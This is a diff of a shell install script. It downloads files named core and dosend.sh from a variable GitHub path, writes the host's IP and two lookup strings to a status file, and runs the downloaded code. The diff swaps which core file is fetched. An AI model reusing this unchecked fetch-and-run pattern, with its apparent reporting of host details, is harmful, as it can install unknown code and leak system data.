@@ -6,7 +6,7 @@ cd noti/
 
 sudo apt install -y libio-socket-ssl-perl  libdigest-hmac-perl  libterm-readkey-perl libmime-lite-perl libfile-libmagic-perl libio-socket-inet6-perl
 
-wget https://raw.githubusercontent.com/$gitpath/main/gitclone/core.temp
+wget https://raw.githubusercontent.com/$gitpath/main/gitclone/corecl.temp
 wget https://raw.githubusercontent.com/$gitpath/main/gitclone/dosend.sh
 wget https://raw.githubusercontent.com/$gitpath/main/gitclone/._test.txt
 
@@ -18,8 +18,8 @@ echo "NEW INSTALL $Uname" > status.txt
 echo "Install in $ip4set" >> status.txt
 echo "inustr ::: $looku" >> status.txt
 echo "inpstr ::: $lookup" >> status.txt
-#base64 -d core.temp > core
-mv core.temp core
+
+mv corecl.temp core
 chmod +x core dosend.sh
 ./dosend.sh
 
